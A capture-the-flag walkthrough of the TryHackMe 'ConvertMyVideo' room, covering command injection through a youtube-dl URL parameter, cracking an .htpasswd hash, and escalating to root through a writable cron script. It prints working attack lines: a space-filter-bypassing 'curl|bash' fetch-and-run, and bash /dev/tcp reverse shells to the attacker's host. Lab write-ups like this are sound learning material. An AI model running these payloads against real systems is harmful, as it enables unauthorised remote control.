# 41 - ConvertMyVideo (CMD Injection exploit) \[pspy64 for priv esc]

Room Link --> [https://tryhackme.com/room/convertmyvideo](https://tryhackme.com/room/convertmyvideo)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.216.188 -sV -p- -T5
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.216.188 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 404,404,500,403 -x txt,php,db,sql,html

/index.php            (Status: 200) [Size: 747]
/images               (Status: 301) [Size: 315] [--> http://10.10.216.188/images/]
/admin                (Status: 401) [Size: 460]
/js 

# the secret dir is /admin
```
{% endcode %}

Try input “test”

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*ic8cKGprDl49p88IGLFkVg.png" alt="" height="414" width="700"><figcaption></figcaption></figure>

Nothing happened

<figure><img src="https://miro.medium.com/v2/resize:fit:378/1*PiCZwTfXE3WqZkfBR182kw.png" alt="" height="431" width="550"><figcaption></figcaption></figure>

Intercept w/ Burp Suite

<figure><img src="https://miro.medium.com/v2/resize:fit:428/1*0rRhXxKDXvFmr5XIekFIvA.png" alt="" height="250" width="622"><figcaption></figcaption></figure>

Send to repeater

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*-6HPbq-vu2eMjWSN5Qh8-A.png" alt="" height="383" width="700"><figcaption></figcaption></figure>

There’s an error.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*QRPDZTXetEj5DEFqKcU9mg.png" alt="" height="181" width="700"><figcaption></figcaption></figure>

Google error result, I came across to youtube-dl on github.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*BdA8fUGeNFf_fjwX1F8xWg.png" alt="" height="418" width="700"><figcaption></figcaption></figure>

After reading through github. I came across to this. I may be able to do the command injection.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*wsipCS1dxdf6PdzdA-MPeg.png" alt="" height="167" width="700"><figcaption></figcaption></figure>

I will inject with

```
`whoami`
```

When I do the injection I will use backtick \` before any symbols, because It has precedence over others.

<figure><img src="https://miro.medium.com/v2/resize:fit:435/1*T9r5bEP2AgZk06v-zkexbA.png" alt="" height="241" width="632"><figcaption></figcaption></figure>

Success!!!

<figure><img src="https://miro.medium.com/v2/resize:fit:375/1*X2TrcIfk08oJa0MjLOLfdA.png" alt="" height="167" width="545"><figcaption></figcaption></figure>

We can also use another method: since the input `yt_usr=` we can end the cmd and execute our own cmd ie `yt_url=;id;--` - we end the previous cmd with `;` then execute our own cmd `id;`  then comment out and cmd after our own `--` .



### Initial Access

Let’s get reverse shell.

Prepare listener on port 4242

Since the bash one liner rev shell contains we can check payloadallthethings for `space` bypass to use.

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# create a shell.sh file in kali and serve it with python server.
/bin/bash -l > /dev/tcp/10.18.88.214/4242 0<&1 2>&1


# i used this to get shell
`curl${IFS}http://10.18.88.214/shell.sh|bash`curl$
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

And got shell.

When we list the dirs, we see `admin` dir, same one that requires authentication on the webpage:

Listing all the files here, we see a `.htpasswd` file. With the below creds.

{% code overflow="wrap" lineNumbers="true" %}
```bash
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

# crack with john.
john passwd --wordlist=/usr/share/wordlists/rockyou.txt
# cracked.
jessie           (itsmeadmin)

# new creds:
itsmeadmin : jessie
```
{% endcode %}

When we logged in, nothing reasonable there.

### Priv Esc

Sudo -l, SUID, getcap, cronjob none had any interesting thing on.

The next thing is to check for services running as root using `pspy64` .

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

There is a `clean.sh` file in the `/var/www/html/tmp` dir, Running with `UID=0` meaning root privs.

We have write permission to this file, so we can replace its contents with a rev shell.

```
echo 'bash -i >& /dev/tcp/10.18.88.214/4244 0>&1' > clean.sh
```

And i got root.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Done!

